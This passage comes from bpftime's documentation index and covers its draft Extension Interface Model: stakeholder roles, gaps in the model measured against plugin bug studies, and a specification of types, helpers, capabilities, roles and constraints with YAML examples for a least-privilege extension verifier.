safety.</p> </li> <li> <p>UprobeRole: The <code>UprobeRole</code> aggregates these capabilities and attributes. An extension assigned this role can use the listed APIs and must respect the defined constraints.</p> </li> <li> <p>Extension Exported Function: The extension can define its own entry points that the host calls when the uprobe fires. For all global functions, the extension can treat them as its own entry points. The global functions types will be resolved from BTF.</p> </li> </ul> <p>Share on  Share on </p>"},{"location":"bpftime/EIM/usage/","title":"EIM Usage and people involved (Draft v1)","text":"<p>Below is a description of how various stakeholders in the eBPF extension ecosystem can use and benefit from the Extension Permission and Control Model (EIM). The EIM defines a structured, verifiable way to allow extensions (like eBPF code) to run within a host environment (like a kernel or userspace runtime) securely and reliably.</p> <p>We have several types of people involved in the ecosystem:</p> <ol> <li>Runtime Developers (eBPF runtime developers) </li> <li>Application Developers </li> <li>Security/Policy Authors (those who define security requirements and models) </li> <li>Extension Developers </li> <li>End Users of Extensions</li> </ol> <p>The EIM and the concepts of roles, capabilities, attributes, typed interfaces, and formal verification affect each stakeholder differently.</p>"},{"location":"bpftime/EIM/usage/#1-runtime-developers-ebpf-runtime-developers","title":"1. Runtime Developers (eBPF runtime developers)","text":"<p>Role: They build and maintain the underlying system that loads, verifies, and executes eBPF-based extensions.  </p> <p>How They Use EIM: - Defining the Verification Framework:   They use EIM concepts to implement a generic verifier that can enforce typed interfaces, capability rules, and attribute constraints. Their runtime includes logic to:   - Parse Roles, Capabilities, Attributes, and Types.   - Perform static or symbolic verification to ensure extension compliance.</p> <ul> <li>Ensuring Generic and Portable Principles:   They strive to keep runtime principles generic enough to apply across multiple environments. For example:</li> <li>Running on kernel space vs. userspace.</li> <li> <p>Supporting various OS or containerized environments.   The runtime should be flexible, allowing application developers to define their own sets of host APIs, capabilities, and roles without altering the runtime\u2019s core logic.</p> </li> <li> <p>Scalability to New Scenarios:   Their contribution is making sure the EIM constructs (roles, attributes, capabilities) are sufficiently abstract to handle new host functions or new safety models. This means:</p> </li> <li>The runtime\u2019s verification engine must adapt to new host APIs easily.</li> <li>The runtime must handle evolving sets of attributes (e.g., new memory constraints, new safety flags) without code changes.</li> </ul> <p>Outcome for Runtime Developers: They provide a stable, extensible foundation. Their success is measured by how easily new applications and extensions integrate with minimal adjustments.</p>"},{"location":"bpftime/EIM/usage/#2-application-developers","title":"2. Application Developers","text":"<p>Role: They create applications that can be extended by external eBPF code. They define the extension points, which roles are available, and what host APIs can be called.</p> <p>How They Use EIM: - Defining Abstractions for Extension Points:   They identify hook points in their application (like \u201con request arrival\u201d or \u201con event X\u201d) and specify which capabilities and roles apply there. For instance:   - A network application might define a <code>NetworkObserverRole</code> that grants read-only access to certain packet data (capability <code>PacketRead</code>) and sets attributes like <code>max_memory</code>.   - A monitoring application might have a <code>TracingRole</code> that allows calling <code>bpf_probe_read</code> and related APIs, but not altering memory.</p> <ul> <li>Creating uFuncs and Hook Points:   Application developers use \u201cuFuncs\u201d or extension entry points as a stable API surface for extensions. They map these uFuncs to Roles:</li> <li> <p>E.g., <code>UPROBE_ENTRY(extension_entry, (int, int) -&gt; void)</code> might be associated with a <code>UprobeRole</code>.</p> </li> <li> <p>Abstracting Away Requirements:   They start from what the extension should do (e.g., read some data, perform a calculation) and formalize the required capabilities and attributes. They produce a configuration that the runtime and verifier can easily check.</p> </li> </ul> <p>Outcome for Application Developers: They offer a clearly defined interface and environment for extensions, ensuring that only safe, verified code runs within their application\u2019s extension points.</p>"},{"location":"bpftime/EIM/usage/#3-securitypolicy-authors-those-who-define-security-requirements","title":"3. Security/Policy Authors (Those Who Define Security Requirements)","text":"<p>Role: They specify security policies, constraints, and safety models for extensions. This may be security officers, system architects, or admins who set global policies on what extensions can do.</p> <p>How They Use EIM: - Defining Roles and Capabilities Aligned with Security Policies:   They write down rules like:   - \u201cExtensions in <code>BasicSecurityRole</code> can only read memory, not write it.\u201d   - \u201c<code>NetworkSafeRole</code> must have <code>network_access = false</code> to prevent outgoing connections.\u201d</p> <ul> <li>No Changes to Verifier Code Needed:   They rely on the runtime\u2019s generic verification engine and EIM\u2019s flexible attribute system. They don\u2019t need to rewrite the verifier for every new policy. Instead, they:</li> <li>Add attributes like <code>may_have_side_effect = false</code> to forbid certain operations.</li> <li> <p>Compose capabilities to disallow certain host APIs or restrict usage frequency.</p> </li> <li> <p>Future Work and Safety Models:   Security authors can experiment with different safety models by adjusting roles and attributes. For example, they can define a \u201cStrictRole\u201d that enforces more stringent constraints. Future expansions could add new attributes or capabilities without modifying the verifier\u2019s code, just the policy definitions.</p> </li> </ul> <p>Outcome for Security Authors: They gain a systematic way to define and enforce security models, ensuring that any extension admitted into the environment meets their prescribed safety and resource constraints.</p>"},{"location":"bpftime/EIM/usage/#4-extension-developers","title":"4. Extension Developers","text":"<p>Role: They write the actual extension code (e.g., eBPF programs) that plug into the application\u2019s defined hook points.</p> <p>How They Use EIM: - Adhering to Typed Interfaces and Constraints:   They see a clearly documented set of Roles and Capabilities. For example:   - If they want to run under <code>UprobeRole</code>, they know they can call <code>bpf_probe_read</code>. If they call unavailable APIs, the verifier will reject their extension.   - They must ensure their code never tries to call APIs not allowed in their assigned role.</p> <ul> <li> <p>Meeting Attribute Constraints:   They must write code that fits within <code>max_memory</code> and respects <code>allow_memory_write</code>. If their role doesn\u2019t allow memory writes, they must avoid them or risk verification failure.</p> </li> <li> <p>Confidence Through Verification:   By following the typed interfaces and constraints, extension developers can be confident that if their extension passes verification, it will run safely in the target environment. They don\u2019t have to guess what\u2019s allowed\u2014they consult the role and capability definitions.</p> </li> </ul> <p>Outcome for Extension Developers: They have a clear guide on what is allowed and how to write safe, accepted extension code. They focus on logic rather than compatibility guesswork.</p>"},{"location":"bpftime/EIM/usage/#5-end-users-of-extensions","title":"5. End Users of Extensions","text":"<p>Role: They deploy and use these extensions in their environment, benefiting from added functionality.</p> <p>How They Use EIM: - Trust in the System:   When a user picks an extension, they trust that it\u2019s been verified against the roles and capabilities defined by the application and security policies. They don\u2019t need to understand the low-level details.</p> <ul> <li> <p>Simplicity and Reliability:   They just load the extension. If it passes verification, it runs safely. If it fails verification, the system rejects it, preventing unsafe scenarios.</p> </li> <li> <p>Seamless Experience:   Users get a stable system that doesn\u2019t crash or misbehave due to ill-defined extensions because all constraints are checked beforehand.</p> </li> </ul> <p>Outcome for End Users: They enjoy a more robust, secure experience without dealing with the complexities of verification. They benefit from safe, stable, and predictable extension behavior.</p>"},{"location":"bpftime/EIM/usage/#putting-it-all-together","title":"Putting It All Together","text":"<ul> <li>Runtime Developers ensure the infrastructure and verification logic can handle flexible sets of rules.</li> <li>Application Developers define how their applications can be extended, creating roles and capabilities that shape the extension environment.</li> <li>Security/Policy Authors set the ground rules and security models as attributes and constraints, ensuring compliance with organizational or system-level policies.</li> <li>Extension Developers use these rules and definitions to write compliant, secure extensions that pass verification.</li> <li>End Users trust the system to enforce rules, letting them safely run extensions without requiring deep technical involvement.</li> </ul> <p>In summary, the EIM specification creates a structured ecosystem where each stakeholder knows their part: runtime developers build the verification engine, application developers define extension points, security authors specify constraints, extension developers write code within these constraints, and end users run verified extensions confidently.</p> <p>Share on  Share on </p>"},{"location":"bpftime/EIM/draft-spec/current-EIM-lack/","title":"EIM on verify: what can it do and what cannot","text":"<p>Below is a high-level discussion of how the Extension Interface Model (EIM) could help mitigate or prevent many of the bugs uncovered in the three \u201cbug study\u201d sets (browser/IDE extensions, database/webserver modules, and hypervisor/container plugins)\u2014and what additional features or details EIM might need in practice, especially if relying on an eBPF-style verification in userspace.</p>"},{"location":"bpftime/EIM/draft-spec/current-EIM-lack/#1-recap-how-eim-helps","title":"1. Recap: How EIM Helps","text":"<p>EIM\u2019s core strength is fine-grained capability control for extensions. In all three bug sets, a dominant root cause was that plugins/extensions had too much power (e.g., full read/write to critical host APIs, or unconstrained code execution in a single large address space). EIM addresses this by:</p> <ol> <li>Enumerating Resources and Capabilities </li> <li>Instead of letting an extension do \u201cwhatever it wants,\u201d we precisely list which host variables, functions, or data structures the extension can access.  </li> <li> <p>Example: If a plugin only needs to read a database\u2019s \u201ctimestamp\u201d function, EIM\u2019s development-time spec declares that function as a capability\u2014then the deployment-time spec can decide whether a particular extension instance actually gets that function or not.</p> </li> <li> <p>Separating Development-time vs. Deployment-time </p> </li> <li>The development-time spec (written by the host\u2019s authors) enumerates all possible resources and extension points in the host.  </li> <li>The deployment-time spec (defined by the system admin or security team) grants only the subset of capabilities needed by each specific plugin in a real deployment.  </li> <li> <p>This separation often blocks the typical \u201cinstall an extension, it auto-gets all privileges\u201d scenario that caused many of the vulnerabilities in the bug studies.</p> </li> <li> <p>Resource Limits </p> </li> <li>EIM supports bounding CPU instructions or memory usage: <code>instructions&lt;10000</code>, <code>memory&lt;1MB</code>, etc.  </li> <li> <p>If enforced by a runtime that can measure or intercept extension behavior (eBPF-style, or a process sandbox), such resource limits throttle infinite loops or memory leaks that might otherwise bring down the host.</p> </li> <li> <p>Function and Data Constraints </p> </li> <li>EIM can attach pre-/post-conditions or argument constraints to capabilities (e.g., \u201cThe extension can call <code>foo()</code>, but must not pass null pointers,\u201d or \u201creturn value must be non-negative\u201d).  </li> <li>This helps mitigate some logic errors or injection-type flaws, because the extension framework can intercept calls that violate constraints.</li> </ol> <p>Overall, EIM can substantially reduce the attack surface by preventing an extension from (1) calling unexpected host APIs, (2) reading/writing uninitialized or privileged memory, or (3) hogging resources. These measures cut off many vectors of exploitation or catastrophic failure.</p>"},{"location":"bpftime/EIM/draft-spec/current-EIM-lack/#2-gaps-in-the-current-eim-spec","title":"2. Gaps in the Current EIM Spec","text":"<p>While EIM is already powerful, some of the bugs from the studies highlight areas where we might need more expressiveness or runtime checks than the current EIM draft describes. Below are the most relevant gaps and how to address them.</p>"},{"location":"bpftime/EIM/draft-spec/current-EIM-lack/#21-concurrency-and-race-conditions","title":"2.1 Concurrency and Race Conditions","text":"<p>Many real extension bugs involved race conditions or concurrency issues (e.g., the Eclipse PMD plugin deadlock, or Gatekeeper/Kyverno race conditions in Kubernetes). EIM currently allows specifying function/variable access capabilities, but not:</p> <ul> <li>Thread/locking constraints </li> <li>Ordering constraints (e.g., \u201cExtension must run after the host has locked resource X\u201d)  </li> <li>Atomic or transaction boundaries around extension code</li> </ul> <p>Potential EIM Addition: Let EIM declare concurrency models or \u201clocking capabilities.\u201d For instance:</p> <pre><code>Lock_Capability(\n  name = \"acquireLogLock\",\n  resource = global_log_mutex\n)\n</code></pre> <p>Then the extension either has or does not have permission to hold certain locks\u2014enforced by the runtime\u2019s lock manager. Alternatively, the host\u2019s concurrency policies might require that certain extension entries are single-threaded. EIM would need to:</p> <ol> <li>Identify concurrency-critical resources at development time.  </li> <li>Allow the deployment spec to say, e.g., \u201cThis extension can only be called from a single thread,\u201d or \u201cThis extension must run under lock X.\u201d  </li> </ol> <p>This approach helps reduce or prevent subtle concurrency flaws.</p>"},{"location":"bpftime/EIM/draft-spec/current-EIM-lack/#22-complex-data-structures-and-partial-field-access","title":"2.2 Complex Data Structures and Partial Field Access","text":"<p>Some vulnerabilities (e.g., certain XSS bugs, or read/write out of bounds in memory) occur when an extension manipulates a large data structure it shouldn\u2019t fully control. EIM\u2019s current approach\u2014<code>read(r)</code> or <code>write(r)</code>\u2014is somewhat coarse if <code>r</code> is a pointer to a big struct or buffer.</p> <p>Potential EIM Addition: More granular field-level constraints, for instance:</p> <pre><code>Field_Access_Capability(\n  struct_name = Request,\n  field = \"headers\",\n  operation = read\n)\n</code></pre> <p>This means an extension can read only the \u201cheaders\u201d field of a request, but not the entire request. If your verifying runtime (like an eBPF loader) can track pointer offsets and check that the extension never goes beyond \u201cheaders,\u201d you effectively reduce the risk of out-of-bounds or unauthorized data access.</p>"},{"location":"bpftime/EIM/draft-spec/current-EIM-lack/#23-protocol-or-semantic-constraints","title":"2.3 Protocol or Semantic Constraints","text":"<p>A few examples from the bug sets revolve around logic vulnerabilities\u2014like \u201cthis plugin must not forward traffic to an internal admin endpoint unless the user is authenticated.\u201d EIM\u2019s existing constraints can check argument values for a function call, but does not define a protocol-level logic policy (e.g., request-smuggling checks, cross-origin validation).</p> <p>Potential EIM Addition: EIM could let developers define \u201csemantic constraints\u201d for critical calls\u2014like a rewriting or proxying function. For instance:</p> <pre><code>Function_Capability(\n    name = \"rewriteUrl\",\n    prototype = (char *url) -&gt; int,\n    constraints = {\n       // Pseudocode: no internal IP addresses allowed\n       \"!(url in 127.0.0.0/8 || url in 10.0.0.0/8)\",\n       \"must match a certain domain pattern\"\n    }\n)\n</code></pre> <p>The extension loader or an inlined checker would refuse calls that break these rules. This technique is somewhat advanced\u2014one either needs a domain-specific language to express these rules or a hooking mechanism that checks them at runtime. But it\u2019s exactly how one might block SSRF or request smuggling.</p>"},{"location":"bpftime/EIM/draft-spec/current-EIM-lack/#24-handling-user-logic-or-untrusted-scripts","title":"2.4 Handling \u201cUser Logic\u201d or Untrusted Scripts","text":"<p>Many plugin frameworks (like browser extensions or IDE plugins) let you embed arbitrary scripts. EIM only enumerates resources and usage constraints at a high level. For memory-safe code or eBPF, that\u2019s feasible\u2014the eBPF verifier can ensure you do not step out of bounds or call disallowed helpers. However, if the plugin is just plain Java or JavaScript code, we still need some sort of sandbox or \u201cverifier\u201d that enforces EIM constraints in practice.</p> <p>Potential EIM Addition: A standard library or \u201chost runtime\u201d that:</p> <ol> <li>Intercepts calls to host functions (matching the function capabilities).  </li> <li>Enforces memory access limitations (in Java, that might be done with a special classloader; in C/C++, that might be an SFI or eBPF JIT approach).  </li> <li>Checks concurrency constraints or resource usage (like CPU time or memory).  </li> </ol> <p>In short: EIM by itself is \u201cpolicy specification.\u201d We also need a policy enforcement mechanism. If that enforcement uses an \u201ceBPF-style\u201d bytecode check in userspace, then the extension code presumably compiles to eBPF or some bytecode that can be validated. The EIM rules become an input to that validator. Once validated, the extension runs in a restricted environment.  </p>"},{"location":"bpftime/EIM/draft-spec/current-EIM-lack/#25-observability-and-logging","title":"2.5 Observability and Logging","text":"<p>In the bug studies, some critical vulnerabilities (e.g., Falco dropping events, or memory leaks in Adblock Plus\u2019s <code>$rewrite</code>) were made worse by insufficient logging or monitoring that the plugin was stuck in a loop. EIM doesn\u2019t explicitly define how to log extension behavior or notify administrators if an extension is over resource limits or hits an illegal call.</p> <p>Potential EIM Addition: \u201cObserver capabilities\u201d that let the host watch the extension\u2019s usage. For example:</p> <ul> <li><code>onExceedMemory</code>: an event if the extension crosses memory &lt; 1 MB.  </li> <li><code>onForbiddenCall</code>: if the extension tries to call a disallowed function.  </li> <li><code>Event_Capability</code>: could define a structured event feed that logs extension misbehavior.</li> </ul> <p>This helps detect issues early, especially for performance or DoS bugs.  </p>"},{"location":"bpftime/EIM/draft-spec/current-EIM-lack/#3-mapping-eim-to-the-bug-studies","title":"3. Mapping EIM to the Bug Studies","text":"<p>Below are a few concrete examples of how EIM could mitigate some typical bugs from the bug sets:</p> <ol> <li>Browser Extensions:  </li> <li>Suppose you have a password manager extension like LastPass. Instead of letting it read any DOM content, EIM\u2019s deployment-time spec might say \u201cthis extension can only read from a small set of fields, and can only call an encryption function with certain arguments.\u201d That significantly reduces the chance of credentials leaking to random pages.  </li> <li> <p>If the extension tries to open arbitrary iframes or run code in the background, the EIM runtime can block those calls unless the extension is explicitly granted the <code>openIframe</code> or <code>spawnBackgroundScript</code> capabilities.</p> </li> <li> <p>IDE Plugins:  </p> </li> <li>In an IDE plugin that performs code analysis (e.g., SonarLint), EIM can require it to call only certain scanning APIs and read only certain parts of the file system. If it tries to load user credentials or memory from the IDE process, it gets blocked by the capability checks.  </li> <li> <p>This also helps with performance: you can set <code>instructions &lt; 1 billion</code> so a plugin can\u2019t hog CPU forever.</p> </li> <li> <p>Database Extensions:  </p> </li> <li>For Postgres or MySQL add-ons, EIM would define each \u201cUDF or extension function\u201d as a potential extension entry. The capability list might restrict which core DB functions (e.g., <code>SPI_exec</code>, <code>malloc()</code>, etc.) the extension can call, and put a memory limit on each call. That stops the extension from corrupting data or hogging memory.  </li> <li> <p>If the extension wants \u201cread table X, but not table Y,\u201d you could define a partial read capability that only includes certain table handles.</p> </li> <li> <p>Web Server / Modules:  </p> </li> <li> <p>The next time Nginx or Apache loads a module, EIM ensures the module can only parse certain request data, or only call the official server API for logging, not raw pointer arithmetic over the server\u2019s memory. Overflows and injection flaws become less likely (though not fully eliminated if the code has internal logic errors).</p> </li> <li> <p>Hypervisor / Container Plugins:  </p> </li> <li>For something like Docker or Kubernetes, EIM can tie directly into the eBPF-based extension system. The deployment spec would say, \u201cThis plugin can call helper BPF functions for networking, but can\u2019t read or write arbitrary kernel memory,\u201d or \u201cThis extension has concurrency constraints with no direct spinlocks.\u201d  </li> <li>That would thwart RCE on the host if a malicious container tries to load a plugin that calls unauthorized kernel helpers or manipulates privileges.</li> </ol>"},{"location":"bpftime/EIM/draft-spec/current-EIM-lack/#4-putting-it-all-together","title":"4. Putting It All Together","text":""},{"location":"bpftime/EIM/draft-spec/current-EIM-lack/#41-how-eim-solves-or-mitigates-the-bug-study-problems","title":"4.1 How EIM \u201cSolves\u201d or Mitigates the Bug Study Problems","text":"<ul> <li>Least Privilege: If each plugin/extension from the bug sets had been restricted by an EIM policy, then:</li> <li>A malicious or buggy extension would not see unauthorized global variables, privileged host functions, or unlimited memory.  </li> <li>This eliminates entire classes of vulnerabilities where the plugin did something the host never intended (like reading credentials from memory or calling privileged code to bypass security checks).</li> <li>Enforced Resource Limits: Many DoS or infinite loop style bugs would be partly mitigated by bounding CPU instructions or memory usage in EIM. The plugin might still fail internally, but it can\u2019t crash the entire system.</li> <li>Runtime Checks: If we specify logic constraints (e.g., \u201cURL rewriting can\u2019t target internal subnets\u201d), that would have blocked some SSRF or request-smuggling vulnerabilities in web server modules. Likewise, concurrency constraints might reduce race conditions in certain plugin frameworks.</li> </ul>"},{"location":"bpftime/EIM/draft-spec/current-EIM-lack/#42-what-must-be-added-or-clarified","title":"4.2 What Must Be Added or Clarified","text":"<ol> <li>Concurrency Control: EIM should have a way to specify or limit how the extension uses threads/locks.  </li> <li>Granular Data Structure Access: Possibly a more advanced \u201cfield-level read/write\u201d declaration so that an extension can\u2019t alter fields it shouldn\u2019t.  </li> <li>Protocol / Logic Constraints: If you want to protect against advanced logic flaws like request smuggling or malicious traffic rewriting, you\u2019ll need a way to describe semantic checks in EIM (or do them in the verifying loader).  </li> <li>Robust Runtime / Verifier: The host system must have a mechanism to interpret EIM specs and enforce them. An eBPF-like user-space verifier is an excellent approach if your extensions can compile to eBPF or a similar bytecode.  </li> <li>Observability: Additional EIM declarations or host APIs to track extension misbehavior (like event counters or logs) so that silent bugs don\u2019t remain undetected.</li> </ol>"},{"location":"bpftime/EIM/draft-spec/current-EIM-lack/#5-conclusion","title":"5. Conclusion","text":"<p>EIM, as presented, already addresses many of the root causes observed in the plugin/extension bugs: overly broad privileges, unrestricted memory access, lack of clear resource bounds, etc. By enumerating resources (variables, functions) and restricting them via capabilities, we can prevent entire classes of security and stability failures.</p> <p>However, to fully tackle the range of real-world bugs (especially concurrency, complex logic checks, or partial data structure access), EIM may need:</p> <ul> <li>Extended concurrency and data-structure constraints </li> <li>More advanced \u201csemantic checking\u201d for sensitive function calls  </li> <li>A robust \u201cverifier\u201d or sandbox that can interpret and enforce EIM policies at runtime, much like eBPF or RLBox approaches do with safe interposition</li> </ul> <p>In essence, EIM is an ideal policy framework for specifying \u201cwho can do what,\u201d while an eBPF-style verifier in userspace is an ideal enforcement mechanism\u2014they complement each other. With a few additions to EIM\u2019s specification (concurrency, deeper structural or protocol constraints), many of the bugs in the three large sets of extension vulnerabilities could be drastically mitigated or outright prevented.</p> <p>Share on  Share on </p>"},{"location":"bpftime/EIM/draft-spec/spec/","title":"Extension Inferface Model Specification V3","text":""},{"location":"bpftime/EIM/draft-spec/spec/#1-scope","title":"1. Scope","text":"<p>This specification defines a model (EIM) for controlling the loading and execution of code extensions within a host environment. The model ensures that such extensions operate safely, within defined constraints, and only invoke allowed host-provided functions under controlled conditions.</p> <p>EIM includes six key concepts:</p> <ul> <li>Types: Ensure data correctness and safe usage patterns.</li> <li>Extension-Exported Entries: Functions exposed by the extension, serving as hooks or callbacks for the host.</li> <li>Host-Provided Functions (Helpers): Host functions callable by the extension, subject to verification and constraints.</li> <li>Capabilities: A set of host-provided functions grouped with constraints, serving as permission bundles.</li> <li>Roles: A set of Extension-Exported Entries plus constraints that govern their usage and indirectly control capabilities</li> <li>Constraints: Conditions that ensure resource limits, operational restrictions, and safe execution at every level of the model.</li> </ul> <p>These concepts collectively enable a principle-of-least-privilege approach and formal verification of extension correctness and safety.</p>"},{"location":"bpftime/EIM/draft-spec/spec/#2-normative-references","title":"2. Normative References","text":"<p>The normative language used herein (\"MUST\", \"MUST NOT\", \"SHOULD\", \"SHOULD NOT\") is as defined in RFC 2119. Unless otherwise noted, all statements are normative requirements.</p>"},{"location":"bpftime/EIM/draft-spec/spec/#3-terms-and-definitions","title":"3. Terms and Definitions","text":"<ul> <li>Extension: Dynamically loaded code that the host can invoke at defined hook points, analogous to an eBPF program or a plugin.</li> <li>Host Environment: The system or runtime that loads the extension and provides host-provided functions (helpers).</li> </ul>"},{"location":"bpftime/EIM/draft-spec/spec/#4-key-concepts","title":"4. Key Concepts","text":""},{"location":"bpftime/EIM/draft-spec/spec/#41-types","title":"4.1 Types","text":"<p>Definition: A Type associates a base data type (e.g., <code>int</code>, <code>char*</code>) with a set of constraints that values of that type must satisfy. Constraints on types (type-level constraints) can include properties such as <code>non_null</code>, <code>null_terminated</code>, or <code>value \u2265 0</code>.</p> <p>Definition (Type):</p> <p>A type <code>\u03c4 \u2208 T</code> is defined as <code>(BaseType, Constraints(\u03c4))</code>, where:</p> <ul> <li><code>BaseType</code> is a primitive or composite data type (e.g., <code>int</code>, <code>size_t</code>, <code>char*</code>, or a struct).</li> <li><code>Constraints(\u03c4)</code> is a finite set of logical predicates that must hold for any value of that type (e.g., non_null, bounded integer, null_terminated).</li> </ul> <p>Type System Requirements:</p> <ul> <li>For each <code>\u03c4 \u2208 T</code>, <code>Constraints(\u03c4)</code> must be decidable, enabling static or symbolic verification.</li> <li>The verifier checks that arguments and return values of all functions (hooks and helpers) adhere to their declared type constraints.</li> </ul> <p>Example:</p> <pre><code>types:\n  - name: \"int_positive\"\n    base: \"int\"\n    constraints: [\"value \u2265 0\"]\n  - name: \"const_char_ptr\"\n    base: \"char*\"\n    constraints: [\"non_null\", \"null_terminated\"]\n</code></pre>"},{"location":"bpftime/EIM/draft-spec/spec/#42-extension-exported-entries","title":"4.2 Extension-Exported Entries","text":"<p>An Extension-Exported Entry is a function provided by the extension that the host can call. It defines an interface point (hook) at which the host invokes the extension\u2019s logic.</p> <p>Definition:</p> <pre><code>e = (Name_e, (\u03c41, \u03c42, ..., \u03c4m) -&gt; \u03c4_out, E_Constraints)\n</code></pre> <ul> <li>The host invokes these hooks.</li> <li>Hooks must adhere to all declared constraints (type-level and function-level).</li> </ul> <p>Requirements:</p> <ul> <li>Each extension-exported entry MUST declare its parameter and return types, and any function-level constraints.</li> <li>If the extension-exported entry\u2019s constraints or types are violated at runtime, verification MUST fail and the extension MUST NOT be loaded or executed.</li> </ul>"},{"location":"bpftime/EIM/draft-spec/spec/#example","title":"Example:","text":"<pre><code>extension_exports:\n  - name: \"process_data\"\n    signature:\n      params:\n        - { type: \"int_positive\", name: \"count\" }\n      return_type: \"int_positive\"\n    constraints:\n      - \"return \u2265 0\"\n</code></pre> <p>And uprobe/uretprobe hooks</p> <p>One Extension-Exported Entries(hook) means it has the same type and execution model.</p>"},{"location":"bpftime/EIM/draft-spec/spec/#43-host-provided-functions-helpers","title":"4.3 Host-Provided Functions (Helpers)","text":"<p>Host-Provided Functions (Helpers) are functions offered by the host environment that the extension may call if allowed by the assigned role and capabilities. These enable the extension to interact with host resources (e.g., reading files, sending packets) under controlled conditions.</p> <p>Definition (Host Function):</p> <p>Each Host-Provided <code>h \u2208 H</code> is defined as:</p> <pre><code>h = (Name_h, (\u03c41, \u03c42, ..., \u03c4n) -&gt; \u03c4_out, F_Constraints)\n</code></pre> <ul> <li><code>(\u03c41, \u03c42, ..., \u03c4n)</code>: Parameter types subject to type constraints.</li> <li><code>\u03c4_out</code>: Return type subject to type constraints.</li> <li><code>F_Constraints</code>: Additional function-level constraints (e.g., write memory, side-effect markers).</li> </ul> <p>Verifier Checks for Host APIs:</p> <ul> <li>Ensures arguments and returns satisfy type constraints.</li> <li>Checks function-level constraints, such as side effects, resource allocation, or error signaling.</li> </ul> <p>Requirements:</p> <ul> <li>Each helper MUST define its signature in terms of types and may have additional function-level constraints.</li> <li>If an extension attempts to call a helper with arguments violating its type-level or function-level constraints, the verifier MUST detect this and prevent loading or execution.</li> </ul> <p>Example (Host-Provided Function):</p> <pre><code>host_functions:\n  - name: \"host_read_file\"\n    signature:\n      params:\n        - { type: \"int_positive\", name: \"fd\" }\n      return_type: \"int\"\n    function_constraints:\n      - \"return \u2265 -1\"\n</code></pre> <p>Example:</p> <pre><code>// Constraints: filename.non_null, mode.non_null, return \u2265 -1,\nint host_open_file(const char *filename, const char *mode);\n</code></pre> <p>If <code>fd</code> is negative, calling <code>host_read_file</code> violates <code>int_positive</code> constraints, causing verification failure.</p>"},{"location":"bpftime/EIM/draft-spec/spec/#44-capabilities","title":"4.4. Capabilities","text":"<p>Definition:</p> <pre><code>Capability = (Name_c, H_c, Cap_Constraints)\n</code></pre> <ul> <li><code>Name_c</code>: The capability's name.</li> <li><code>H_c</code>: A subset of Host-Provided Functions included in this capability.</li> <li><code>Cap_Constraints</code>: Constraints applicable to these helpers as a group (e.g., <code>read_only = true</code>).</li> </ul> <p>Requirements:</p> <ul> <li>A capability groups a set of helpers and may impose additional constraints on their usage.</li> <li>The extension may only use helpers provided by capabilities assigned to its role.</li> <li>If a capability states conditions like <code>read_only = true</code>, then adding a write  helpers to the  Capability violates the constraints, causing verification failure.</li> </ul> <p>The Cap_Constraints can be from the F_Constraints, and need to verify:</p> <ol> <li>if\u00a0Capability \u00a0were missing\u00a0<code>read_only</code>, adding a write helpers means add\u00a0<code>read_only</code> \u00a0= false to\u00a0Capability </li> <li>If Capability  has\u00a0<code>read_only</code>\u00a0== false, you can add a write helpers to it.</li> <li>If Capability  has\u00a0<code>read_only</code>\u00a0== true, you cannot add a write helpers to it.</li> </ol> <p>Example:</p> <pre><code>capabilities:\n  - name: \"FileRead\"\n    apis: [\"host_read_file\"]\n    constraints:\n      - \"read_only = true\"\n</code></pre> <p><code>FileRead</code> capability restricts the extension to read-only file operations.</p>"},{"location":"bpftime/EIM/draft-spec/spec/#45-roles","title":"4.5. Roles","text":"<p>A Role can be understood as a selection of extension-exported entries governed by a set of constraints.</p> <p>Definition:</p> <pre><code>Role = (Name_R, Exported_R, Constraints_R)\n</code></pre> <ul> <li><code>Name_R</code>: The role's name.</li> <li><code>Exported_R \u2286 Extension-Exported Entries</code>: The set of extension-exported functions (hooks) that this role makes available.</li> <li><code>Constraints_R</code>: governing not only resource limits and operational policies, but also the implicit availability or prohibition of certain capabilities. These constraints can reference capabilities by name, effectively linking which host-provided functions the extension can use through these capabilities.</li> </ul> <p>A role can be viewed as primarily a set of extension-exported entries (i.e., the functions the extension provides to the host) combined with a collection of constraints that control what the extension can do. Through these constraints, a role can effectively allow or disallow the use of specific capabilities. In other words, while the role does not explicitly contain a list of capabilities, its constraints can mention capabilities by name (e.g., use_capability: FileRead) or forbid them (e.g., !NetAccess). This approach maintains a minimal definition of a role while still enabling fine-grained control over the extension\u2019s allowed helpers and operations.</p> <p>Note on Inheritance:</p> <p>Optionally, a role may inherit from another role, merging constraints. If inheritance is used, conflicting constraints must be resolved. This feature is not essential to the core model.</p> <p>Requirements:</p> <ul> <li>A role primarily determines which extension hooks are available and under what conditions capabilities (and thus helpers) can be used.</li> <li>The role\u2019s constraints MUST be satisfied for the extension to run.</li> </ul> <p>Example of Role-Level Constraints Interacting with Capabilities:</p> <p>Suppose we have two capabilities:</p> <pre><code>capabilities:\n  - name: \"NetAccess\"\n    apis: [\"host_send_packet\"]\n    constraints:\n      - \"side_effects = network\"\n\n  - name: \"FileRead\"\n    apis: [\"host_read_file\"]\n    constraints:\n      - \"read_only = true\"\n</code></pre> <p>A role might look like:</p> <pre><code>roles:\n  - name: \"DataProcRole\"\n    exported: [\"process_data\"]\n    constraints:\n      - \"memory_usage \u2264 65536\"\n      - \"side_effects = false\"\n      - \"use_capability: FileRead\"\n      - \"!NetAccess\"   # This forbids the NetAccess capability.\n</code></pre> <p>Here:</p> <ul> <li><code>side_effects = false</code> is a constraint that forbids any helpers with <code>side_effects = t</code>rue.</li> <li><code>use_capability: FileRead</code> states that the <code>FileRead</code> capability is allowed, granting access to <code>host_read_file</code>.</li> <li><code>!NetAccess</code> explicitly forbids the <code>NetAccess</code> capability, so even if some global policy would have allowed it, the role disallows it.</li> </ul> <p>This demonstrates how <code>Constraints_R</code> can define a relationship between capabilities and a role. By using <code>!Capability</code>, we forbid certain capabilities; by referencing the capability by name (e.g., <code>use_capability: FileRead</code>), we allow it.</p>"},{"location":"bpftime/EIM/draft-spec/spec/#46-constraints","title":"4.6. Constraints","text":"<p>Definition: Constraints are logical conditions that MUST hold at various levels: type, function, capability, and role. They unify resource limitations, operational policies, type rules, and side-effect restrictions.</p> <p>Requirements:</p> <ul> <li>Constraints must be decidable and enforceable by the verifier.</li> <li>Any violation of constraints (type-level, function-level, capability-level, or role-level) MUST cause verification to fail.</li> </ul> <p>Examples of Constraints:</p> <ul> <li>Type-level: <code>value \u2265 0</code></li> <li>Function-level (helper or extension entry): <code>return \u2265 -1</code></li> <li>Capability-level: <code>read_only = true</code></li> <li>Role-level: <code>side_effect</code>, <code>memory_usage \u2264 65536</code>, <code>!NetAccess</code></li> 